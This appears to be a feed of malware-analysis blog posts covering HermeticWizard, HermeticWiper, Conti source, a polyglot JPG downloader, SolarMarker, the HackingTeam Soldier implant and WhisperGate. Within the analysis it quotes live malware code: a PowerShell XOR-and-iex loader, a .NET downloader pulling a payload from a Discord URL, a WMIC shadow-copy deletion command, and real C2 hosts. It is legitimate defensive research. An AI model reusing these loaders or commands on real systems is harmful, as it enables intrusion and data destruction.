{
  
    
        "post0": {
            "title": "Hermetic Wizard Malware",
            "content": "Overview . In addition to the Hermetic Wiper malware there were at least three other components used to deploy the wiper bundled into a single binary and referred to as HermeticWizard. . Samples . HermeticWizard: a259e9b0acf375a8bef8dbc27a8a1996ee02a56889cba07ef58c49185ab033ec MalwareBazaar Sample . In the resources of HermeticWizard are two spreader components, a WMI spreader, and an SMB spreader. . WMI Spreader (exec_x32.dll) . Samples: 2d29f9ca1d9089ba0399661bb34ba2fd8aba117f04678cd71856d5894aa7150b . SMB Spreader (romance.dll) . Sample: 5a300f72e221a228e3a36a043bef878b570529a7abc15559513ea07ae280bb48 . WMI Spreader Analysis . The WMI spreader is a stand-alone untility that is used to copy files to remote shares and execute them. The spreader is excuted via HermeticWizard using the following example command line. . rundll32 &lt;spreader path&gt; #1 -s &lt;path to HermeticWizard&gt; – i &lt;target IP&gt; . The spreader accepts the following command line arguments:-i,-h,-s,-a,-c . s path to the file to copy | i remote host IP | h optional remote share path (*not confirmed) | a optional brute force share password (*not confirmed) | c optional brute force share username password list (*not confirmed) | . Network Service Account . The spreader checks to see if it has local admin priviledges. If it has local admin it attempts to impersonate the Network Service service account. . Stack Overflow reference . NetworkService account . Limited service account that is meant to run standard privileged services. This account is &gt; far more limited than Local System (or even Administrator) but still has the right to access the network as the machine (see caveat above). . NT AUTHORITY NetworkService | the account has no password (any password information you provide is ignored) | HKCU represents the NetworkService user account | has minimal privileges on the local computer | presents the computer&#39;s credentials to remote servers | SID:S-1-5-20&gt; - has its own profile under the HKEY_USERS registry key (HKEY_USERSS-1-5-20) | If trying to schedule a task using it, enter NETWORK SERVICE into the Select User or Group &gt; dialog | . Share file copy . The spreader attempts to authenticate to the ADMIN&#36; remote share. If a password list is supplied on the command line the share authentication is brute forced. Once authenticated the files are copied to the share. . WMI COM Interface . For programatic access to WMI the wiper uses COM. The COM GUID 4590F812-1D3A-11D0-891F-00AA004B2E24 is used to accesss IWbemClassObject . ... to be continued ... .",
            "url": "https://research.openanalysis.net/hermetic/hermetic%20wizard/spreader/malware/apt/2022/03/10/hermetic_wizard.html",
            "relUrl": "/hermetic/hermetic%20wizard/spreader/malware/apt/2022/03/10/hermetic_wizard.html",
            "date": " • Mar 10, 2022"
        }
        
    
  
    
        ,"post1": {
            "title": "Conti Ransomware V2 Source Code Leak",
            "content": "Overview . Some backstory here, a twitter account @contileaks began posting leaked chat logs and source code from the Conti ransomware group. Initially they posted a password protected archive of the Conti v2 source code. Later posted an archive of the source code with the locker cpp files removed and no password. This was apparently an attempt to prevent others from compiling the source code and using it. The release of the second archive allowed a cryptographic attack on the password protected archive and the release of the full source code. . Builder . The ransomware project comes with a builder that can be used to customize the compiled ransowmare binary (and decryptor). It basically runs a string replace on the binary to insert custom data like the RSA key and the decryption note. Some examples of the replaced strings are below. . __publickey__ __privatekey__ __DECRYPT_NOTE__ . Obfuscation . They are using a macro based on ADVObfuscator to obfuscate strings inline in the code. . #define OBFW(str)((const wchar_t*)MetaBuffer&lt;std::get&lt;MetaRandom2&lt;__COUNTER__, 30&gt;::value&gt;(PrimeNumbers), MetaRandom2&lt;__COUNTER__, 126&gt;::value, std::make_index_sequence&lt;sizeof(str)&gt;&gt;((const unsigned char*)str).decrypt()) . API Hashing . Hashing: MurmurHash2A contant=0x5bd1e995 . They pre-calculate the API hashes and define each API wrapper in api.cpp then call the API definitions in the code. This doesn&#39;t seem like the most efficient way to do API hashing. . Example. . inline DWORD WINAPI pGetProcessId( HANDLE Process ) { DWORD(WINAPI * pFunction)(HANDLE); pFunction = (DWORD(WINAPI*)(HANDLE))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x31d910df, 9);//GetProcAddress(hKernel32, OBFA(&quot;GetProcessId&quot;)); return pFunction(Process); } . Command Args . LPWSTR HostsPath = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-h&quot;)); LPWSTR PathList = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-p&quot;)); LPWSTR EncryptMode = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-m&quot;)); LPWSTR LogsEnabled = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-log&quot;)); . Encryption . Encryption Modes (File To Encrypt) . enum EncryptModes { ALL_ENCRYPT = 10, LOCAL_ENCRYPT = 11, NETWORK_ENCRYPT = 12, BACKUPS_ENCRYPT = 13 }; . Encrypt Modes (File Encryption) . Three modes of encryption based on file type and size. . enum ENCRYPT_MODES { FULL_ENCRYPT = 0x24, PARTLY_ENCRYPT = 0x25, HEADER_ENCRYPT = 0x26 }; . DB files get full encrypt | VM files get partial encrypt | Under 1M is full encrypt | Between 1M - 5M gets header encrypt | Over 5M is partial encrypt | . Partial Encrypt Mode . The partial encrypt mode can encrypt a file by percent, either 20% or 50%. This translates into a &quot;step&quot; size of data blocks that are encrypted in the file. . Delete Shadow Copies . Gain access to WMI via COM. . // Step 1: -- // Initialize COM. // Step 2: -- // Set general COM security levels -- // Step 3: // Obtain the initial locator to WMI - // Step 4: -- // Connect to WMI through the IWbemLocator::ConnectServer method // Connect to the root cimv2 namespace with // the current user and obtain pointer pSvc // to make IWbemServices calls. // Step 5: -- // Set security levels on the proxy - // Step 6: -- // Use the IWbemServices pointer to make requests of WMI - // For example, get the name of the operating system // Step 7: - // Get the data from the query in step 6 - // Get the value of the Name property // Cleanup // ======== . Copy-paste from MSDN WMI . Then use WMI to delete shadows . &quot;cmd.exe /c C: Windows System32 wbem WMIC.exe shadowcopy where &quot;ID=&#39;%s&#39; &quot; delete . KIll File Owner To Free File For Encryption . They use the RestartManager to enumerate processes with a handle to the file they are trying to encrypt. Then they can kill the process. . Crypto . Using the Windows crypto APIs to generate a chacha key CryptGenRandom then they use statically linked chcha algorithm to encrypt files then RSA encrypt the generated key. . The chacha library is a copy-paste from this chacha-merged.c . Also ref wiki article on chacha. . /* chacha-merged.c version 20080118 D. J. Bernstein Public domain. */ . Encrypted File Structure . The file is encrypted based on the encryption mode. The RSA encrypted chacha key is then appended to the encrypted file. Then a buffer containing the encryption mode constant and the data percent value is written to the file. This forms a footer that can be used by the decryptor to decrypt the file. . - encrypted data - RSA encrypted chacha key - byte encryption mode - byte percent value . File Share Scanning . Scan local subnets for hosts, then scan hosts for shares. . Directory Blacklist . OBFW(L&quot;tmp&quot;), OBFW(L&quot;winnt&quot;), OBFW(L&quot;temp&quot;), OBFW(L&quot;thumb&quot;), OBFW(L&quot;$Recycle.Bin&quot;), OBFW(L&quot;$RECYCLE.BIN&quot;), OBFW(L&quot;System Volume Information&quot;), OBFW(L&quot;Boot&quot;), OBFW(L&quot;Windows&quot;), OBFW(L&quot;Trend Micro&quot;) . File Extension Blacklist . OBFW(L&quot;.exe&quot;), OBFW(L&quot;.dll&quot;), OBFW(L&quot;.lnk&quot;), OBFW(L&quot;.sys&quot;), OBFW(L&quot;.msi&quot;), OBFW(L&quot;R3ADM3.txt&quot;), OBFW(L&quot;CONTI_LOG.txt&quot;) . Readme File . The file name is hardcoded in the binary R3ADM3.txt. . Log File . Logging is an option specified as a command parameter. The log file path is hard coded as C: CONTI_LOG.txt. .",
            "url": "https://research.openanalysis.net/conti/ransomware/malware/source/2022/03/03/conti_ransomware_source.html",
            "relUrl": "/conti/ransomware/malware/source/2022/03/03/conti_ransomware_source.html",
            "date": " • Mar 3, 2022"
        }
        
    
  
    
        ,"post2": {
            "title": "Hermetic Wiper Malware",
            "content": "Overview . Sample: 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 . Sample 2: 0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da . References . Sample on Malshare | J. A. Guerrero-Saade Twitter Thread | ESET Twitter Thread | CrowdStrike Blog | SentinalOne Blog | . Backstory . Wiper binary is signed using a code signing certificate issued to Wiper binary is signed using a code signing certificate issued to Hermetica Digital Ltd | Wiper abuses legitimate drivers from the EaseUS Partition Master | Modifying CrashControl regkey, CrashDumpEnabled key to 0 | Enumerating PhysicalDrives up to 100 - can you even have 100 drives?? | . Abused Legit Drivers . The following legit drivers are stored in the resources section of the PE. They are compressed. . RCDATA_DRV_X64 (mscompress) e5f3ef69a534260e899a36cec459440dc572388defd8f1d98760d31c700f42d5 | RCDATA_DRV_X86 (mscompress) b01e0c6ac0b8bcde145ab7b68cf246deea9402fa7ea3aede7105f7051fe240c1 | RCDATA_DRV_XP_X64 (mscompress) b6f2e008967c5527337448d768f2332d14b92de22a1279fd4d91000bb3d4a0fd | RCDATA_DRV_XP_X86 (mscompress) fd7eacc2f87aceac865b0aa97a50503d44b799f27737e009f91f3c281233c17d | . Reversing Notes . Arg1 is a sleep before reboot (in minutes) Arg2 is sleep before ??? (minutes minus the arg1 sleep) . Grants itself SeBackupPrivilege, and SeShutdownPrivilege. Note, SeBackupPrivilege allows file content retrieval, even if the security descriptor on the file might not grant such access. . If the host is Windows Vista and above they use one set of drivers (64/32bit). For XP they use a different set of drivers (32/64bit). . Dissable crashdump using reg key SYSTEM CurrentControlSet Control CrashControl CrashDumpEnabled . Possible driver communication via named pipe . EPMNTDRV 0 . Write the driver from resource to ?? c: Windows system32 Drivers as an mscompress file. Then copy and decompress it to another file with the same name and a .sys file extension. Then grant SeLoadDriverPrivilege priviledges to self and load driver. . for i in range(0,41,4): print(f&quot;DWORD d{i};&quot;) . DWORD d0; DWORD d4; DWORD d8; DWORD d12; DWORD d16; DWORD d20; DWORD d24; DWORD d28; DWORD d32; DWORD d36; DWORD d40; .",
            "url": "https://research.openanalysis.net/hermetic/hermetic%20wiper/wiper/malware/apt/2022/02/27/hermetic_wiper.html",
            "relUrl": "/hermetic/hermetic%20wiper/wiper/malware/apt/2022/02/27/hermetic_wiper.html",
            "date": " • Feb 27, 2022"
        }
        
    
  
    
        ,"post3": {
            "title": "Reversing Unknown Polyglot JPG Downloader",
            "content": "Overview . The sample originated as a message through wechat. The mawlare is currently unknown. Submissions to VirusTotal indicate that the original file name was 申博公司服务器采购表.exe which roughly translates to Shenbo company server purchase form.exe . Sample: 104bd2d33c119d007df2adbc571a3e8cfac722cf1f0b6156ba211f413905e9f4 . When executed the sample downloads a polyglot jpg as a second stage from http://43.129.168.248/xlb.jpg . Second Stage: xlb.jpg - 32fb33a87f5123e919eb416b2c95a98b2f4b367812a51758bb1daeaf114b6b50 . Related samples on VirusTotal that download the same second stage. . 天博独立站.bat translating to Tianbo Independent Station | 服务器预付表1docx.bat translating to Server Prepaid Form | . References: . Malshare Sample - Stage 1 | Malshare Sample - Stage 2 (jpg) | Malshare Sample - Stage 3 (not confirmed!) | . Stage 1 . Download http://43.129.168.248/xlb.jpg -&gt; C: ProgramData xlb.jpg . Decrypt jpg starting at offset 83877 using -6 ^ 0x78 for range 7176 then directly execute! . import sys import os JPG_FILEPATH = r&#39;/tmp/work/xlb.jpg&#39; OUT_SHELLCODE_FILEPATH = r&#39;/tmp/work/shellcode.bin&#39; jpg_data = open(JPG_FILEPATH, &#39;rb&#39;).read() jpg_offset = 83877 out = [] for i in range(0,7176): out.append(((jpg_data[jpg_offset+i] - 6) &amp; 0xff) ^ 0x78) open(OUT_SHELLCODE_FILEPATH, &#39;wb&#39;).write(bytes(out)) . 7176 . Stage 2 . Check mutex ozhpanvityfxknsr to ensure we are only running once. . Check for a list of process names. . proc_names = [&#39;rr&#39;,&#39;471&#39;,&#39;tphpv&#39;,&#39;rjejbo&#39;,&#39;ufmfhsbn&#39;,&#39;hpphmf&#39;,&#39;xfdibu&#39;,&#39;gmzwqo&#39;,&#39;fu/fyf&#39;,&#39;xqt&#39;,&#39;ntfehf&#39;,&#39;fydfm&#39;,&#39;xpse&#39;,&#39;qpjou&#39;,&#39;usbz&#39;,&#39;gjsfgpy&#39;,&#39;thuppm&#39;,&#39;dmpve&#39;,&#39;opufqbe&#39;,&#39;dbmd&#39;,&#39;{ivepohgbohzv&#39;,&#39;mjof&#39;,&#39;rvjdlr&#39;] . for n in proc_names: out = &#39;&#39; for i in n: out += chr((ord(i) -1)&amp;0xff) print(out) . C2 Comms . The malware connect to the C2 via a TCP socket using a hardcoded IP and port 43.129.168.248:16166 . The malware sendd the C2 the it&#39;s current module name and waits to receive data. . The c2 return data is composed of a structure including a flag, length, xor key, data. . // DWORD flag // DWORD length // BYTE xor_key[32] // Data ... . The C2 data contains a stage3 PE file that is reflectivly loaded into memory by the malware and executed via the export PluginMe . Stage 3 . Stage3 was not directly recovered from the download chain but was recovered as an artifact from the infected host. An assumption was made that this was stage3 based on the unique export PluginMe. . Sample: 7d47e5871efc4c079531513f29926d394922d7954701f34dc6244ea311d20969 . Reversing Tips . The binary is witten in C++ with STL using MSVC 6.0 (very old). The STL types cause all kinds of pain but we can using Lumina and FLIRT to identify most of the functions. Rolf has a nice IDA script that will add some STL structs to IDA for us. . One STL type the pops up is the List. To use the script to add this struct simply run it in IDA then use MakeListTypes(DWORD) in the Python CLI to define the structs. . We also had trouble with the string object. This was resolved on stream. . General . Mutex name: db38wzikd . Store data in registry under key HKEY_CURRENT_USER Software 2345.com Mini . logname | . The logname is composed of the hostname username and timestamp likes so hostname-username-timestamp . &quot;%d%02d%02d%02d%02d%02d&quot;, SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond . group | host | install | . C2 Comms . C2 host: tesla.tomcat.buzz port 16333 -&gt; used to resolve to 43.129.168.248 (same as stage 1,2 C2) . The sample connects to the C2 and immediatly expects to recieve commands, no data is sent initially. . The C2 recv data is encrypted with ^ 0x33 - 103 . C2 command xlbfdc might cause the RAT to upload its accumulated data. .",
            "url": "https://research.openanalysis.net/polyglot/downloader/malware/ghost%20rat/gh0st/2022/02/20/polyglot_dropper_ghost.html",
            "relUrl": "/polyglot/downloader/malware/ghost%20rat/gh0st/2022/02/20/polyglot_dropper_ghost.html",
            "date": " • Feb 20, 2022"
        }
        
    
  
    
        ,"post4": {
            "title": "Jupyter Infostealer",
            "content": "Overview . Packed sample: ee904ce81c66b774897f93b0301e297a9137295516d57ba1c4e078a383cbce39 . The sample is too big for Malshare raw but we zipped it and uploaded it, the password is infected Malshare Zip Sample. . This is also known by some other names: Jupyter, Polazert, solarmarker, YellowCockatoo . References: . Morphisec Blog: Jupyter Infostealer | CrowdStrike: Blocking SolarMarker Backdoor | Talos: Solarmarker | . Unpacking Inno - Stage 1 . Tools . Inno Extractor (950208c1b7d4d901ca7b942f98214098dc91480cc70af1af12b2291544eb761f) | Inno Setup Decompiler (Pascal Decompiler) (602e0a4e1efaff739ee308da7fd4c4b5ca3aa6d0640f47ef74b0d445f968301b) | DirWatch (031e8f61f1501a76015d3add269663172abc648973032dcff4e758effa66b235) | . Behaviour . Inno installer drops and executes a benign file to attempt to look legitimate Docx2Rtf.exe (caf8e546f8c6ce56009d28b96c4c8229561d10a6dd89d12be30fa9021b1ce2f4) | The Inno compile Pascal script is used for the malicious install | The script drop two .txt files in %TEMP% with random names | One file is executed 9 times with PowerShell and is used to decrypt and launch the second file, which is also PowerShell | . Manual Extraction . Use Inno Extractor to extract all files from the Inno installer | Use Inno Setup Decompiler to decompile the extracted CompiledCode.bin file | Use DirWatch to monitor %temp% directory with &quot;auto save&quot; option eabled | Grab the two .txt PowerShell files that were dropped in %temp% - These are Stage 2 | . The PowerShell code below is used to decrypt the 2nd .txt PowerShell file . ; $xk=&#39;&#39;szikwYdJyBvQLWRAeNXPGaxEObVolScHnrKtqhMpfDjTIUgFuCmZ&#39;&#39;; $xb=[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($p)); remove-item $p; for($i=0;$i -lt $xb.count;){ for($j=0;$j -lt $xk.length;$j++){ $xb[$i]=$xb[$i] -bxor $xk[$j]; $i++; if($i -ge $xb.count){$j=$xk.length} } }; $xb=[System.Text.Encoding]::UTF8.GetString($xb); iex $xb; . Stage 2 - PowerShell Deobfuscation . The 2nd stage PowerShell file is Base64 encoded and encrypted with a hard-coded XOR key (found in the first PowerShell script). Once decrypted the script is used to decrypt and reflectivly load a .NET assembly into it&#39;s own proccess memory. . Manual Extraction . Instead of attempting to maually decode the PowerShell we can take advantage of the fact that it relfectivly loads a .NET assembly to simply dump the assembly out of the process. . Run the malware and watch the process tree with ProcessHacker | When the PowerShell process executes suspend it (there are 9, just grab the one that stays running) | Use ExtreamDumper to dump the .NET assembly out of the PowerShell process | . Stage 3 - .NET Assembly . Config . ver = &quot;DR/1.1&quot;; xorkey = &quot;FVdXLbjs0Rwxsz9CrFh0pSot6Gijigf8t56R&quot;; addr = &quot;http://91.241.19.21&quot; . Hardware ID . The hardware ID is stored in %userprofile% AppData Roaming solarmarker.dat and is just a random string. . C2 Traffic . C2 traffic is encrypted using the xorkey from the hard coded config, then base64 encoded. . Command: ping . { &quot;action&quot;:&quot;ping&quot;, &quot;hwid&quot;:hwid, &quot;pc_name&quot;:M.GetComputerName(), &quot;os_name&quot;:M.GetWinVersion(), &quot;arch&quot;:M.Is64x()?&quot;x64&quot;:&quot;x86&quot;, &quot;rights&quot;:M.IsAdmin()?&quot;Admin&quot;:&quot;User&quot;, &quot;version&quot;:ldrConfig.ver, &quot;workgroup&quot;:M.GetWorkGroup()|M.WMI(&quot;win32_computersystem&quot;,&quot;domain&quot;), &quot;dns&quot;:(M.WMI(&quot;win32_computersystem&quot;,&quot;partofdomain&quot;).ToLower()==&quot;false&quot;)?&quot;0&quot;:&quot;1&quot;, &quot;protocol_version&quot;:1 } . The C2 can a command via the status var in the response json. The status can be either exe, ps1, or command. . Status: EXE and PS1 . The C2 can send down a stage4 payload that is either a PS1 or an EXE. For PS1 they create a file in %TEMP% and execute it with PowerShell just like the Stage 1 loader. If it&#39;s an EXE they drop it in the %TEMP% and execute it directly. . Status: Command . The C2 can send a PowerShell command that is directly executed. .",
            "url": "https://research.openanalysis.net/jupyter/malware/solarmarker/config/dot%20net/2022/01/30/jupyter_stealer.html",
            "relUrl": "/jupyter/malware/solarmarker/config/dot%20net/2022/01/30/jupyter_stealer.html",
            "date": " • Jan 30, 2022"
        }
        
    
  
    
        ,"post5": {
            "title": "HackingTeam Soldier Implant",
            "content": "Overview . HackingTeam Soldier Implant (packed): 76840fa18df8764afb51f1aa6da10ff65f1bdfe434dc988917380fa31fbe3a73 . All samples on available on Malshare. . References: . Packed Sample on Malshare | Hacking Team Source Code Leak | Noah Labs Blog (360) Hacking Team Solider Implant Analysis | . Unpacking VMP . Run wihtout debugger and pause with ProcessHacker | Attach with x64dbg and search .text for MSVC securty cookie constant | Based on security cookie constant location determine __security_init_cookie function location | Add hardware bp on __security_init_cookie function and relaunch process with debugger | Use call stack to determine what called __security_init_cookie function this is OEP | Remove hardware bp from __security_init_cookie and add hardware bp on OEP | Relaunch program so we break on OEP | Use VMPImportFixer to dump process | Fix OEP statically (PEBear) | . TODO: When we dump with VMPImportFixer there are some imports that are not protected in the binary. These are not captured by VMPImportFixer which means some of our imports are not resolved in the dump! We could maybe fix this by either patching VMPImportFixer to also add unprotected imports ... or we could update VMPFix to add both protected imports and normal imports to the new IAT then dump with Scylla instead of VMPImportFixer. . Config Extraction . The config is AES encrypted with CBC and a null IV | There is a seperate setup function that is used to load the key which is hard coded in the .data section | The config is stored in the .data section and is preceded by a DWORD with the length | . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . data_len = 0x240 data = unhex(&#39;238ba1f22cb105cdae82eb2dde4e2783c80370198e1bb02c231825e7b2d8c164109e5a4e09c63a36df5ed3c5ce49b825968d386eb9008ed2b6cae3b75cd8ba76d49ab1acf69d46a747934187883b2eb27aaab99dae892693dc714433ec2de2d238a036f5ff492414a6a4928f4bd907342e7fff0dd6e61f2a7675b351842a27bc1ba7d5ad7ebc44a11cfafd136f42644db89db7189c4d152a06b10f0c0a4b40c021d7192a04cd383b17434048768076c7d7eb073ef340c696aa35946aacbe99821352487082660334de43ca4e5e142d78f70dc7cb5b571463c3c3c7caf461eac5411136142b0051914f74859c44610f8e4fdcf4f6c269b03809e3aa67ebc3474ece444fe2f5078d36857c17147d834c6cb6ccd9effefca8b24ee01c0868fc1383ef26519c4f573f94b5bbb7b149dcc190f0a08fdc31965d69d97bbcf565e829182b8aa421f46a7e0100180d7ed9d31083b4b68431e0b888bbacb00864f140716359290eb37927ec0ea537b620e1108265f412a28c28c2df0cf1d713880cd874f79872dde1060d29cc7536684d49b504dcfc61c80a1210a5e69533bba05aad0a6dc7239ea90e29e822e0424f06524330a98f40e56c1149bad0350b6c79b1c03963e0cf43dce2f6f6e6412dee43ef937bff51bf345e57bc60c7df2ec4294cc2789547896a53dc43ab5fc15c6a377d0dbab97ff5e091f90fc28ad7acda94543b52bccea2c8f360e03a5fc01cab6d358804037ab20e17facc31293b437b7a22d8c32f835308fae01b83396667f18b47882e93b309ee31cc3e9c619a6a405db7e3bbcc&#39;) data = data[:data_len] key = unhex(&#39;60ab854458b00a742c6e8ceb7f1094da&#39;) def decrypt(data, key): from Crypto.Cipher import AES cipher = AES.new(key, AES.MODE_CBC, iv=b&#39; x00&#39;*16) return cipher.decrypt(data) # remember to split the rest of the string after the null decrypt(data, key) . b&#39;{&#34;camera&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0,&#34;iter&#34;:0},&#34;position&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;screenshot&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;photo&#34;:{&#34;enabled&#34;:false},&#34;file&#34;:{&#34;enabled&#34;:false},&#34;addressbook&#34;:{&#34;enabled&#34;:false},&#34;chat&#34;:{&#34;enabled&#34;:false},&#34;clipboard&#34;:{&#34;enabled&#34;:false},&#34;device&#34;:{&#34;enabled&#34;:true},&#34;call&#34;:{&#34;enabled&#34;:false},&#34;messages&#34;:{&#34;enabled&#34;:false},&#34;password&#34;:{&#34;enabled&#34;:false},&#34;keylog&#34;:{&#34;enabled&#34;:false},&#34;mouse&#34;:{&#34;enabled&#34;:false},&#34;url&#34;:{&#34;enabled&#34;:true},&#34;sync&#34;:{&#34;host&#34;:&#34;178.128.215.46&#34;,&#34;repeat&#34;:600},&#34;uninstall&#34;:{&#34;date&#34;:null,&#34;enabled&#34;:false}} x00&#34; x04&amp; xceB xa0 x82 xd4.U x81 x8d xdb x1ai] xae xbdZ x85 x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e&#39; . .text:012EF39B 3D EF BE AD DE cmp eax, 0DEADBEEFh .text:012EF3A0 75 09 jnz short loc_12EF3AB .text:012EF3A2 B8 01 00 00 00 mov eax, 1 .text:012EF3A7 8B E5 mov esp, ebp .text:012EF3A9 5D pop ebp .text:012EF3AA C3 retn .text:012EF3AB 56 push esi .text:012EF3AC 68 58 B5 38 01 push offset config_key .text:012EF3B1 50 push eax .text:012EF3B2 68 57 02 38 01 push offset asc_1380257 ; &quot;#&quot; .text:012EF3B7 E8 84 14 00 00 call mw_aes_decrypt . import pefile import re import struct pe_data = open(&#39;/tmp/work/ht.exe.fixed&#39;, &#39;rb&#39;).read() pe = pefile.PE(data = pe_data) target_code = pe_data.split(b&#39; xEF xBE xAD xDE&#39;)[1] egg = b&#39; x68(....). x68(....) xe8&#39; m = re.search(egg, target_code) if not m: print(&quot;All hope is lost!&quot;) config_va = struct.unpack(&#39;&lt;I&#39;, m.group(2))[0] key_va_bytes = m.group(1) config_offset = pe.get_offset_from_rva(config_va - pe.OPTIONAL_HEADER.ImageBase) config_len = struct.unpack(&#39;&lt;I&#39;, pe_data[config_offset -4:config_offset])[0] config_data = pe_data[config_offset:config_offset+config_len] tohex(config_data) . b&#39;238ba1f22cb105cdae82eb2dde4e2783c80370198e1bb02c231825e7b2d8c164109e5a4e09c63a36df5ed3c5ce49b825968d386eb9008ed2b6cae3b75cd8ba76d49ab1acf69d46a747934187883b2eb27aaab99dae892693dc714433ec2de2d238a036f5ff492414a6a4928f4bd907342e7fff0dd6e61f2a7675b351842a27bc1ba7d5ad7ebc44a11cfafd136f42644db89db7189c4d152a06b10f0c0a4b40c021d7192a04cd383b17434048768076c7d7eb073ef340c696aa35946aacbe99821352487082660334de43ca4e5e142d78f70dc7cb5b571463c3c3c7caf461eac5411136142b0051914f74859c44610f8e4fdcf4f6c269b03809e3aa67ebc3474ece444fe2f5078d36857c17147d834c6cb6ccd9effefca8b24ee01c0868fc1383ef26519c4f573f94b5bbb7b149dcc190f0a08fdc31965d69d97bbcf565e829182b8aa421f46a7e0100180d7ed9d31083b4b68431e0b888bbacb00864f140716359290eb37927ec0ea537b620e1108265f412a28c28c2df0cf1d713880cd874f79872dde1060d29cc7536684d49b504dcfc61c80a1210a5e69533bba05aad0a6dc7239ea90e29e822e0424f06524330a98f40e56c1149bad0350b6c79b1c03963e0cf43dce2f6f6e6412dee43ef937bff51bf345e57bc60c7df2ec4294cc2789547896a53dc43ab5fc15c6a377d0dbab97ff5e091f90fc28ad7acda94543b52bccea2c8f360e03a5fc01cab6d358804037ab20e17facc31293b437b7a22d8c32f835308fae01b83396667f18b47882e93b309ee31cc3e9c619a6a405db7e3bbcc&#39; . .text:013031B6 0F 10 05 7A 01 38 01 movups xmm0, xmmword_138017A .text:013031BD 0F 11 05 58 B5 38 01 movups config_key, xmm0 . key_egg = b&#39; x0F x10 x05(....) x0F x11 x05&#39; + key_va_bytes m = re.search(key_egg, pe_data) if not m: print(&quot;All hope is lost!&quot;) key_data_va = struct.unpack(&#39;&lt;I&#39;, m.group(1))[0] key_data_offset = pe.get_offset_from_rva(key_data_va - pe.OPTIONAL_HEADER.ImageBase) key_data = pe_data[key_data_offset:key_data_offset+16] tohex(key_data) . b&#39;60ab854458b00a742c6e8ceb7f1094da&#39; . decrypt(config_data, key_data) . b&#39;{&#34;camera&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0,&#34;iter&#34;:0},&#34;position&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;screenshot&#34;:{&#34;enabled&#34;:false,&#34;repeat&#34;:0},&#34;photo&#34;:{&#34;enabled&#34;:false},&#34;file&#34;:{&#34;enabled&#34;:false},&#34;addressbook&#34;:{&#34;enabled&#34;:false},&#34;chat&#34;:{&#34;enabled&#34;:false},&#34;clipboard&#34;:{&#34;enabled&#34;:false},&#34;device&#34;:{&#34;enabled&#34;:true},&#34;call&#34;:{&#34;enabled&#34;:false},&#34;messages&#34;:{&#34;enabled&#34;:false},&#34;password&#34;:{&#34;enabled&#34;:false},&#34;keylog&#34;:{&#34;enabled&#34;:false},&#34;mouse&#34;:{&#34;enabled&#34;:false},&#34;url&#34;:{&#34;enabled&#34;:true},&#34;sync&#34;:{&#34;host&#34;:&#34;178.128.215.46&#34;,&#34;repeat&#34;:600},&#34;uninstall&#34;:{&#34;date&#34;:null,&#34;enabled&#34;:false}} x00&#34; x04&amp; xceB xa0 x82 xd4.U x81 x8d xdb x1ai] xae xbdZ x85 x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e x0e&#39; .",
            "url": "https://research.openanalysis.net/vmprotect/malware/unpacking/soldier/hackingteam/2022/01/27/hackingteam_soldier.html",
            "relUrl": "/vmprotect/malware/unpacking/soldier/hackingteam/2022/01/27/hackingteam_soldier.html",
            "date": " • Jan 27, 2022"
        }
        
    
  
    
        ,"post6": {
            "title": "WhisperGate Malware",
            "content": "Overview . Stage 1 - MBR Wiper: a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92 . Stage 2 - Downloader: dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78 . Stage 3 - File Corruptor (injector): 9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d . Stage 4 - Final (unpacked on stream): 34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907 . All samples on available on Malshare. . References: . Elastic Security Research - Operation Bleeding Bear | S2W TALON - Analysis of Destructive Malware (WhisperGate) targeting Ukraine | Stage 1 - Analysis From Hexorcist (YouTube) | . Stage 2 - Downloader . This is a .NET binary that is obfuscated with NetReactor. We can use NetReactorSlayer to remove the obfuscation. Just drag the binary over and yes to all options. . TODO: Find a way to identify NetReactor obfuscation -- is there a signature for it? List of .NET de-obfuscation tools . Functionality . Download Stage3 binary from Discord | Binary is downloaded as Tbopbh.jpg and is reversed | Reverse binary and load it directly as a .NET assembly | Call Ylfwdwgmpilzyaph method from loaded Stage3 .NET assembly | . Sample Functions . private static byte[] ChangeFacade() { Facade.ReflectFacade(); try { ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; } catch { } byte[] array = (byte[])typeof(WebClient).GetMethod(&quot;DxownxloxadDxatxxax&quot;.Replace(&quot;x&quot;, &quot;&quot;), new Type[] { typeof(string) }).Invoke(new WebClient(), new object[] { &quot;https://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg&quot; }); if (array.Length &gt; 1) { Array.Reverse(array, 0, array.Length); } return array; } private static void FillFacade(MethodInfo[] spec) { foreach (MethodInfo methodInfo in spec) { if (methodInfo.Name == &quot;Ylfwdwgmpilzyaph&quot;) { methodInfo.Invoke(null, null); } } } . Stage 3 - File Corruptor (Injector) . This is a .NET binary that appears to be obfuscated with Eazfuscator and we know from Stage2 that it is loaded as a .NET assembly and the method Ylfwdwgmpilzyaph is where the code starts. Because it is loaded as an assembly it doesn&#39;t have an entrypoint and cannot be launched directly like a regular PE file. . For Eazfuscator we can try some tools like de4dot and EazFizer but they all fail because Eazfuscator has actually virtualized the functions. 